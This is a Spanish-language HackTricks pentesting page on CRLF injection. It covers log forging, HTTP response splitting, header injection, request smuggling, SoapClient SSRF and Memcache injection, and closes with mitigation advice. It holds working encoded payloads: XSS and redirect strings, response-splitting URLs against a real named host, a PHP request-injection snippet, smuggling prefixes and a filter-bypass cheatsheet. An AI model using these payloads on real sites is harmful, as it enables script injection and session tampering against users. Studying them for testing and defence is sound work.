# CRLF (%0D%0A) Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **reg√≠strate** en **Intigriti**, una **plataforma de recompensas por errores premium creada por hackers, para hackers**! √önete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy, y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

### CRLF

Carriage Return (CR) y Line Feed (LF), conocidos colectivamente como CRLF, son secuencias de caracteres especiales utilizadas en el protocolo HTTP para denotar el final de una l√≠nea o el inicio de una nueva. Los servidores web y los navegadores utilizan CRLF para distinguir entre los encabezados HTTP y el cuerpo de una respuesta. Estos caracteres se emplean universalmente en las comunicaciones HTTP/1.1 a trav√©s de varios tipos de servidores web, como Apache y Microsoft IIS.

### Vulnerabilidad de Inyecci√≥n CRLF

La inyecci√≥n CRLF implica la inserci√≥n de caracteres CR y LF en la entrada proporcionada por el usuario. Esta acci√≥n enga√±a al servidor, la aplicaci√≥n o el usuario para interpretar la secuencia inyectada como el final de una respuesta y el comienzo de otra. Aunque estos caracteres no son inherentemente da√±inos, su uso indebido puede llevar a la divisi√≥n de respuestas HTTP y otras actividades maliciosas.

### Ejemplo: Inyecci√≥n CRLF en un Archivo de Registro

[Ejemplo de aqu√≠](https://www.invicti.com/blog/web-security/crlf-http-header/)

Considera un archivo de registro en un panel de administraci√≥n que sigue el formato: `IP - Hora - Ruta Visitada`. Una entrada t√≠pica podr√≠a verse as√≠:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
Un atacante puede explotar una inyecci√≥n CRLF para manipular este registro. Al inyectar caracteres CRLF en la solicitud HTTP, el atacante puede alterar el flujo de salida y fabricar entradas de registro. Por ejemplo, una secuencia inyectada podr√≠a transformar la entrada del registro en:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Aqu√≠, `%0d` y `%0a` representan las formas codificadas en URL de CR y LF. Despu√©s del ataque, el registro mostrar√≠a de manera enga√±osa:
```
IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
El atacante as√≠ oculta sus actividades maliciosas haciendo que parezca que el localhost (una entidad t√≠picamente confiable dentro del entorno del servidor) realiz√≥ las acciones. El servidor interpreta la parte de la consulta que comienza con `%0d%0a` como un solo par√°metro, mientras que el par√°metro `restrictedaction` se analiza como otra entrada separada. La consulta manipulada imita efectivamente un comando administrativo leg√≠timo: `/index.php?page=home&restrictedaction=edit`

### HTTP Response Splitting

#### Descripci√≥n

HTTP Response Splitting es una vulnerabilidad de seguridad que surge cuando un atacante explota la estructura de las respuestas HTTP. Esta estructura separa los encabezados del cuerpo utilizando una secuencia de caracteres espec√≠fica, Carriage Return (CR) seguido de Line Feed (LF), denominados colectivamente como CRLF. Si un atacante logra insertar una secuencia CRLF en un encabezado de respuesta, puede manipular efectivamente el contenido de la respuesta subsiguiente. Este tipo de manipulaci√≥n puede llevar a graves problemas de seguridad, notablemente Cross-site Scripting (XSS).

#### XSS a trav√©s de HTTP Response Splitting

1. La aplicaci√≥n establece un encabezado personalizado como este: `X-Custom-Header: UserInput`
2. La aplicaci√≥n obtiene el valor de `UserInput` de un par√°metro de consulta, digamos "user\_input". En escenarios que carecen de una validaci√≥n y codificaci√≥n de entrada adecuadas, un atacante puede crear una carga √∫til que incluya la secuencia CRLF, seguida de contenido malicioso.
3. Un atacante crea una URL con un 'user\_input' especialmente dise√±ado: `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
* En esta URL, `%0d%0a%0d%0a` es la forma codificada en URL de CRLFCRLF. Enga√±a al servidor para que inserte una secuencia CRLF, haciendo que el servidor trate la parte subsiguiente como el cuerpo de la respuesta.
4. El servidor refleja la entrada del atacante en el encabezado de respuesta, lo que lleva a una estructura de respuesta no intencionada donde el script malicioso es interpretado por el navegador como parte del cuerpo de la respuesta.

#### Un ejemplo de HTTP Response Splitting que lleva a Redirecci√≥n

De [https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)

Navegador a:
```
/%0d%0aLocation:%20http://myweb.com
```
Y el servidor responde con el encabezado:
```
Location: http://myweb.com
```
**Otro ejemplo: (de** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### En la ruta de URL

Puedes enviar la carga √∫til **dentro de la ruta de URL** para controlar la **respuesta** del servidor (ejemplo de [aqu√≠](https://hackerone.com/reports/192667)):
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
Check more examples in:

{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### Inyecci√≥n de Encabezados HTTP

La inyecci√≥n de encabezados HTTP, a menudo explotada a trav√©s de la inyecci√≥n CRLF (Carriage Return and Line Feed), permite a los atacantes insertar encabezados HTTP. Esto puede socavar mecanismos de seguridad como los filtros XSS (Cross-Site Scripting) o la SOP (Same-Origin Policy), lo que podr√≠a llevar al acceso no autorizado a datos sensibles, como tokens CSRF, o a la manipulaci√≥n de sesiones de usuario a trav√©s de la inserci√≥n de cookies.

#### Explotaci√≥n de CORS a trav√©s de la Inyecci√≥n de Encabezados HTTP

Un atacante puede inyectar encabezados HTTP para habilitar CORS (Cross-Origin Resource Sharing), eludiendo las restricciones impuestas por la SOP. Esta brecha permite que scripts de or√≠genes maliciosos interact√∫en con recursos de un origen diferente, accediendo potencialmente a datos protegidos.

#### SSRF e Inyecci√≥n de Solicitudes HTTP a trav√©s de CRLF

La inyecci√≥n CRLF puede ser utilizada para crear e inyectar una nueva solicitud HTTP completamente. Un ejemplo notable de esto es la vulnerabilidad en la clase `SoapClient` de PHP, espec√≠ficamente dentro del par√°metro `user_agent`. Al manipular este par√°metro, un atacante puede insertar encabezados adicionales y contenido del cuerpo, o incluso inyectar una nueva solicitud HTTP por completo. A continuaci√≥n se muestra un ejemplo en PHP que demuestra esta explotaci√≥n:
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

# Put a netcat listener on port 9090
$client->__soapCall("test", []);
```
### Inyecci√≥n de Encabezados para el Smuggling de Solicitudes

Para m√°s informaci√≥n sobre esta t√©cnica y problemas potenciales [**consulta la fuente original**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

Puedes inyectar encabezados esenciales para asegurar que el **back-end mantenga la conexi√≥n abierta** despu√©s de responder a la solicitud inicial:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
Despu√©s, se puede especificar una segunda solicitud. Este escenario t√≠picamente involucra [HTTP request smuggling](http-request-smuggling/), una t√©cnica donde los encabezados adicionales o los elementos del cuerpo a√±adidos por el servidor despu√©s de la inyecci√≥n pueden llevar a varios exploits de seguridad.

**Explotaci√≥n:**

1. **Inyecci√≥n de Prefijo Malicioso**: Este m√©todo implica envenenar la solicitud del siguiente usuario o una cach√© web especificando un prefijo malicioso. Un ejemplo de esto es:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

2. **Creaci√≥n de un Prefijo para el Envenenamiento de la Cola de Respuestas**: Este enfoque implica crear un prefijo que, cuando se combina con basura al final, forma una segunda solicitud completa. Esto puede desencadenar el envenenamiento de la cola de respuestas. Un ejemplo es:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

### Inyecci√≥n de Memcache

Memcache es un **almacenamiento de clave-valor que utiliza un protocolo de texto claro**. M√°s informaci√≥n en:

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

**Para la informaci√≥n completa, lea el**[ **informe original**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)

Si una plataforma est√° tomando **datos de una solicitud HTTP y us√°ndolos sin sanitizarlos** para realizar **solicitudes** a un servidor **memcache**, un atacante podr√≠a abusar de este comportamiento para **inyectar nuevos comandos de memcache**.

Por ejemplo, en la vulnerabilidad descubierta originalmente, se usaron claves de cach√© para devolver la IP y el puerto a los que un usuario deber√≠a conectarse, y los atacantes pudieron **inyectar comandos de memcache** que **envenenar√≠an** la **cach√© para enviar los detalles de las v√≠ctimas** (nombres de usuario y contrase√±as incluidos) a los servidores del atacante:

<figure><img src="../.gitbook/assets/image (659).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&#x26;h=178&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

Adem√°s, los investigadores tambi√©n descubrieron que pod√≠an desincronizar las respuestas de memcache para enviar la IP y los puertos de los atacantes a usuarios cuyo correo electr√≥nico el atacante no conoc√≠a:

<figure><img src="../.gitbook/assets/image (637).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&#x26;h=506&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

### C√≥mo Prevenir Inyecciones CRLF / HTTP Header en Aplicaciones Web

Para mitigar los riesgos de inyecciones CRLF (Carriage Return y Line Feed) o HTTP Header en aplicaciones web, se recomiendan las siguientes estrategias:

1. **Evitar la Entrada Directa del Usuario en los Encabezados de Respuesta:** El enfoque m√°s seguro es abstenerse de incorporar la entrada proporcionada por el usuario directamente en los encabezados de respuesta.
2. **Codificar Caracteres Especiales:** Si evitar la entrada directa del usuario no es factible, aseg√∫rese de emplear una funci√≥n dedicada a codificar caracteres especiales como CR (Carriage Return) y LF (Line Feed). Esta pr√°ctica previene la posibilidad de inyecci√≥n CRLF.
3. **Actualizar el Lenguaje de Programaci√≥n:** Actualice regularmente el lenguaje de programaci√≥n utilizado en sus aplicaciones web a la √∫ltima versi√≥n. Opte por una versi√≥n que inherentemente no permita la inyecci√≥n de caracteres CR y LF dentro de las funciones encargadas de establecer encabezados HTTP.

### CHEATSHEET

[Cheatsheet desde aqu√≠](https://twitter.com/NinadMishra5/status/1650080604174667777)
```
1. HTTP Response Splitting
‚Ä¢ /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
‚Ä¢ //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
‚Ä¢ /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
‚Ä¢ /google.com/%2F..%0D%0AHeader-Test:test2
‚Ä¢ /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
‚Ä¢ /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
‚Ä¢ /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
‚Ä¢ %E5%98%8A = %0A = \u560a
‚Ä¢ %E5%98%8D = %0D = \u560d
‚Ä¢ %E5%98%BE = %3E = \u563e (>)
‚Ä¢ %E5%98%BC = %3C = \u563c (<)
‚Ä¢ Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Herramientas Autom√°ticas

* [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
* [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## Lista de Detecci√≥n de Fuerza Bruta

* [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt)

## Referencias

* [**https://www.invicti.com/blog/web-security/crlf-http-header/**](https://www.invicti.com/blog/web-security/crlf-http-header/)
* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
* [**https://www.netsparker.com/blog/web-security/crlf-http-header/**](https://www.netsparker.com/blog/web-security/crlf-http-header/)

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Consejo de recompensas por errores**: **reg√≠strate** en **Intigriti**, una **plataforma de recompensas por errores premium creada por hackers, para hackers**! √önete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy, y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
